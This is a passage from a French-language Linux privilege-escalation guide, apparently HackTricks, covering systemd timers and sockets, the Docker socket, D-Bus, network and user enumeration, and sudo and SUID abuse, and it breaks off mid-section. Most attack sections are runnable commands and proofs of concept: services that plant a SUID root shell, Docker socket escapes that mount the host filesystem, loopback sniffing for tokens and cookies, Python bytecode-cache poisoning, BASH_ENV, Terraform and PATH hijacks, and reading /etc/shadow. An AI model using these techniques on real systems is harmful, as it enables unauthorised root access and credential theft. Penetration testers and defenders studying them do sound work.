Dans la documentation, vous pouvez lire ce qu'est l'Unit :

> L'unit à activer lorsque ce timer expire. L'argument est un nom d'unit, dont le suffixe n'est pas ".timer". S'il n'est pas spécifié, cette valeur est par défaut un service portant le même nom que l'unit de timer, à l'exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unit activée et celui de l'unit de timer soient identiques, à l'exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devez :

- Trouver une unit systemd (comme un `.service`) qui **exécute un binaire accessible en écriture**
- Trouver une unit systemd qui **exécute un chemin relatif** et sur laquelle vous disposez de **privilèges d'écriture** concernant le **PATH de systemd** (afin d'usurper l'identité de cet exécutable)

**Pour en savoir plus sur les timers, consultez `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer, vous devez disposer des privilèges root et exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou sur des machines différentes dans le cadre de modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication inter-machine et sont configurés via des fichiers `.socket`.<sup>[[14]](#references)</sup>

Les Sockets peuvent être configurés à l’aide de fichiers `.socket`.

**Pour en savoir plus sur les sockets, consultez `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : ces options sont différentes, mais un résumé est utilisé pour **indiquer où le socket va écouter** (le chemin du fichier socket AF_UNIX, l’adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept` : accepte un argument booléen. Si **true**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est transmis. Si **false**, tous les sockets d’écoute eux-mêmes sont **transmis à l’unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFO, pour lesquels une seule unité de service gère inconditionnellement tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performance, il est recommandé d’écrire les nouveaux daemons uniquement de manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : acceptent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la **création** et la liaison des **sockets**/FIFO d’écoute, respectivement. Le premier élément de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost` : **commandes** supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFO d’écoute, respectivement.
- `Service` : spécifie le nom de l’unité de **service** **à activer** lors de la réception de **trafic entrant**. Ce paramètre est uniquement autorisé pour les sockets avec `Accept=no`. Par défaut, il s’agit du service qui porte le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d’utiliser cette option.

### Fichiers .socket accessibles en écriture

Si vous trouvez un fichier `.socket` **accessible en écriture**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor`, et le backdoor sera exécuté avant la création du socket. Vous devrez donc **probablement attendre que la machine soit redémarrée.**\
_Notez que le système doit utiliser la configuration de ce fichier socket, sinon le backdoor ne sera pas exécuté_

### Activation de socket + chemin d’unité accessible en écriture (création du service manquant)

Une autre mauvaise configuration à fort impact est la suivante :

- une unité socket avec `Accept=no` et `Service=<name>.service`
- l’unité de service référencée est manquante
- un attaquant peut écrire dans `/etc/systemd/system` (ou dans un autre chemin de recherche d’unités)

Dans ce cas, l’attaquant peut créer `<name>.service`, puis déclencher du trafic vers le socket afin que systemd charge et exécute le nouveau service avec les privilèges root.

Flux rapide :
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets accessibles en écriture

Si vous **identifiez un socket accessible en écriture** (_nous parlons ici des Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d’exploitation :**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Notez qu’il peut y avoir des **sockets à l’écoute de requêtes HTTP** (_je ne parle pas des fichiers .socket, mais des fichiers agissant comme des sockets Unix_). Vous pouvez le vérifier avec :
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond à une** requête **HTTP**, vous pouvez alors **communiquer** avec celui-ci et peut-être **exploiter une vulnérabilité**.

### Socket Docker accessible en écriture

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l’utilisateur `root` et les membres du groupe `docker`. La possession d’un accès en écriture à ce socket peut entraîner une élévation de privilèges. Voici une présentation de la méthode, ainsi que des alternatives si la Docker CLI n’est pas disponible.

#### **Élévation de privilèges avec la Docker CLI**

Si vous disposez d’un accès en écriture au socket Docker, vous pouvez élever vos privilèges à l’aide des commandes suivantes :<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d’exécuter un conteneur avec un accès root au système de fichiers de l’hôte.

#### **Using Docker API Directly**

Lorsque la Docker CLI n’est pas disponible, le socket Docker peut tout de même être exploité à l’aide de requêtes HTTP brutes via le socket Unix. La méthode la plus fiable est la suivante :

- créer un conteneur auxiliaire à longue durée avec le répertoire racine de l’hôte monté via bind
- le démarrer
- créer une instance `exec` dans ce conteneur auxiliaire
- démarrer l’instance `exec` et récupérer la sortie via l’API

**List Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Créer et démarrer un conteneur auxiliaire**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Créer une instance exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Démarrez l’instance exec et lisez la sortie**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Ce modèle est généralement plus robuste que d’essayer de piloter manuellement `attach` avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances `exec` supplémentaires pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH sous `/host/root/.ssh` ou modifier les fichiers de démarrage de l’hôte.

### Autres

Notez que si vous disposez des permissions d’écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**davantage de moyens d’escalader les privilèges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si [**l’API Docker écoute sur un port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), vous pouvez également parvenir à la compromettre.

Consultez **d’autres moyens de vous échapper des containers ou d’abuser des runtimes de containers pour escalader les privilèges** dans :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalade de privilèges Containerd (ctr)

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante, car **vous pourriez pouvoir l’exploiter pour escalader les privilèges** :


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalade de privilèges **RunC**

Si vous constatez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante, car **vous pourriez pouvoir l’exploiter pour escalader les privilèges** :


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un **système de communication inter-processus (IPC)** sophistiqué qui permet aux applications d’interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il offre un framework robuste pour différentes formes de communication entre applications.<sup>[[16]](#references)</sup>

Le système est polyvalent et prend en charge un IPC de base qui améliore l’échange de données entre les processus, rappelant les **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal envoyé par un daemon Bluetooth concernant un appel entrant peut demander à un lecteur de musique de couper le son, améliorant ainsi l’expérience utilisateur. En outre, D-Bus prend en charge un système d’objets distants, simplifiant les demandes de services et les appels de méthodes entre les applications et rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un **modèle allow/deny**, qui gère les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l’effet cumulatif des règles de policy correspondantes. Ces policies définissent les interactions avec le bus et peuvent potentiellement permettre une escalade de privilèges par l’exploitation de ces permissions.

Un exemple d’une telle policy dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni. Elle détaille les permissions permettant à l’utilisateur root de posséder, d’envoyer et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les policies sans utilisateur ni groupe spécifié s’appliquent universellement, tandis que les policies du contexte « default » s’appliquent à tout ce qui n’est pas couvert par d’autres policies spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez ici à énumérer et exploiter une communication D-Bus :**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d’énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapide du filtrage sortant

Si l’hôte peut exécuter des commandes, mais que les callbacks échouent, distinguez rapidement le DNS, le transport, le proxy et le filtrage des routes :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ports ouverts

Vérifiez toujours les services réseau exécutés sur la machine avec lesquels vous n’avez pas pu interagir avant d’y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifiez les listeners selon leur cible de bind :

- `0.0.0.0` / `[::]` : exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1` : uniquement locaux (bons candidats pour un tunnel/forward).
- Adresses IP internes spécifiques (par ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis les segments internes.

### Workflow de triage des services locaux

Lorsque vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un workflow local rapide est le suivant :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des checks de PE locaux, linPEAS peut fonctionner comme un scanner réseau ciblé. Il utilise les binaries disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un scanner réseau pur (en ignorant le reste des vérifications d'escalade de privilèges).

### Sniffing

Vérifiez si vous pouvez sniffer le trafic. Si c'est possible, vous pourriez récupérer certains identifiants.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) est particulièrement précieux en post-exploitation, car de nombreux services internes uniquement y exposent des tokens/cookies/credentials :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capturez maintenant, analysez plus tard :
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents sur les systèmes, lesquels peuvent **login** et lesquels disposent de **root privileges** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Grand UID

Certaines versions de Linux étaient affectées par une vulnérabilité permettant aux utilisateurs avec un **UID > INT_MAX** d'escalader leurs privilèges. Plus d'informations : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploitez-la** avec : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** susceptible de vous accorder les privilèges root :


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter en tant que chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de générer beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de brute-force un utilisateur avec [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de brute-force les utilisateurs.

## Exploitation d'un PATH accessible en écriture

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourrez peut-être escalader vos privilèges en **créant une backdoor dans le dossier accessible en écriture**, avec le nom d'une commande qui va être exécutée par un autre utilisateur (idéalement root) et qui n'est **pas chargée depuis un dossier situé avant** votre dossier accessible en écriture dans le $PATH.

### SUDO et SUID

Vous pouvez être autorisé à exécuter certaines commandes avec sudo, ou celles-ci peuvent posséder le bit suid. Vérifiez-le avec :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues permettent de lire et/ou d’écrire des fichiers, voire d’exécuter une commande**.<sup>[[8]](#references)</sup> Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration de Sudo peut permettre à un utilisateur d’exécuter certaines commandes avec les privilèges d’un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l’utilisateur `demo` peut exécuter `vim` en tant que `root`. Il est alors trivial d’obtenir un shell en ajoutant une clé SSH dans le répertoire de `root` ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking** permettant de charger une bibliothèque Python arbitraire lors de l’exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Empoisonnement de `__pycache__` / `.pyc` accessible en écriture dans les imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire du package contient un **`__pycache__` accessible en écriture**, vous pouvez peut-être remplacer le `.pyc` mis en cache et obtenir une exécution de code avec les privilèges de l'utilisateur lors de l'import suivant.<sup>[[30]](#references)</sup>

- Pourquoi cela fonctionne :
- CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- L'interpréteur valide l'**en-tête** (magique + métadonnées d'horodatage/hash liées à la source), puis exécute l'objet de code marshalé stocké après cet en-tête.
- Si vous pouvez **supprimer et recréer** le fichier mis en cache parce que le répertoire est accessible en écriture, un `.pyc` appartenant à root mais non accessible en écriture peut tout de même être remplacé.
- Chemin typique :
- `sudo -l` affiche un script ou un wrapper Python que vous pouvez exécuter en tant que root.
- Ce script importe un module local depuis `/opt/app/`, `/usr/local/lib/...`, etc.
- Le répertoire `__pycache__` du module importé est accessible en écriture par votre utilisateur ou par tout le monde.

Énumération rapide :
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Si vous pouvez inspecter le script privilégié, identifiez les modules importés et leur chemin de cache :<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Workflow d'exploitation :

1. Exécutez une fois le script autorisé par sudo afin que Python crée le fichier de cache légitime s'il n'existe pas déjà.
2. Lisez les 16 premiers octets du fichier `.pyc` légitime et réutilisez-les dans le fichier empoisonné.
3. Compilez un objet de code payload, utilisez `marshal.dumps(...)` dessus, supprimez le fichier de cache d'origine, puis recréez-le avec l'en-tête d'origine suivi de votre bytecode malveillant.
4. Réexécutez le script autorisé par sudo afin que l'import exécute votre payload en tant que root.

Notes importantes :

- La réutilisation de l'en-tête d'origine est essentielle, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement à la source.
- Cette technique est particulièrement utile lorsque le fichier source appartient à root et n'est pas accessible en écriture, mais que le répertoire `__pycache__` qui le contient l'est.
- L'attaque échoue si le processus privilégié utilise `PYTHONDONTWRITEBYTECODE=1`, effectue des imports depuis un emplacement disposant de permissions sécurisées ou supprime l'accès en écriture à tous les répertoires du chemin d'importation.

Forme minimale du proof-of-concept :
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Durcissement :

- Assurez-vous qu'aucun répertoire du chemin d'import Python privilégié ne soit accessible en écriture aux utilisateurs non privilégiés, y compris `__pycache__`.
- Pour les exécutions privilégiées, envisagez `PYTHONDONTWRITEBYTECODE=1` ainsi que des vérifications périodiques des répertoires `__pycache__` accessibles en écriture de manière inattendue.
- Traitez les modules Python locaux accessibles en écriture et les répertoires de cache accessibles en écriture de la même manière que les scripts shell ou les bibliothèques partagées accessibles en écriture et exécutés par root.

### BASH_ENV préservé via sudo env_keep → shell root

Si sudoers préserve `BASH_ENV` (par exemple, `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l'invocation d'une commande autorisée.<sup>[[24]](#references)</sup>

- Pourquoi cela fonctionne : pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. De nombreuses règles sudo autorisent l'exécution d'un script ou d'un wrapper shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.<sup>[[23]](#references)</sup>

- Conditions requises :
- Une règle sudo que vous pouvez exécuter (toute cible qui invoque `/bin/bash` de manière non interactive, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC :
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement :
- Supprimer `BASH_ENV` (et `ENV`) de `env_keep`, préférer `env_reset`.
- Éviter les wrappers shell pour les commandes autorisées par sudo ; utiliser des binaires minimaux.
- Envisager la journalisation des entrées/sorties de sudo et les alertes lorsque des variables d’environnement préservées sont utilisées.

### Terraform via sudo avec HOME préservé (!env_reset)

Si sudo laisse l’environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l’utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Pointer le provider requis vers un répertoire accessible en écriture et déposer un plugin malveillant portant le nom du provider (par exemple, `terraform-provider-examples`) :
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échouera lors de la négociation avec le plugin Go, mais exécutera la charge utile en tant que root avant de se terminer, laissant derrière lui un shell SUID.

### Surcharges TF_VAR + contournement de la validation des symlinks

Les variables Terraform peuvent être fournies via des variables d’environnement `TF_VAR_<name>`, qui sont conservées lorsque sudo préserve l’environnement. De faibles validations telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le lien symbolique et copie le véritable `/root/root.txt` vers une destination lisible par l’attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en créant au préalable des liens symboliques de destination (par exemple, en faisant pointer le chemin de destination du provider vers un emplacement situé dans `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à être exécuté depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs tels que des reverse shells, des tâches cron ou des scripts.
```bash
Defaults !requiretty
```
Ce n’est pas une vulnérabilité directe en soi, mais cela élargit les situations dans lesquelles les règles sudo peuvent être abusées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées accessibles en écriture par l’attaquant (par exemple, `/home/<user>/bin`), toute commande relative exécutée dans la cible autorisée par sudo peut être détournée.<sup>[[3]](#references)</sup>

- Prérequis : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée PATH accessible en écriture, recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Contournement des chemins d’exécution de Sudo
**Jump** pour lire d’autres fichiers ou utiliser des **symlinks**. Par exemple, dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c’est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande Sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_, vous pouvez l’exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d’un binaire SUID inhabituel)**.

[Exemples de Payloads à exécuter.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, vous pouvez essayer **d’exporter une fonction** portant le nom de la commande appelée par le fichier suid.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l’exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire SUID, cette fonction sera exécutée

### Script accessible en écriture exécuté par un wrapper SUID

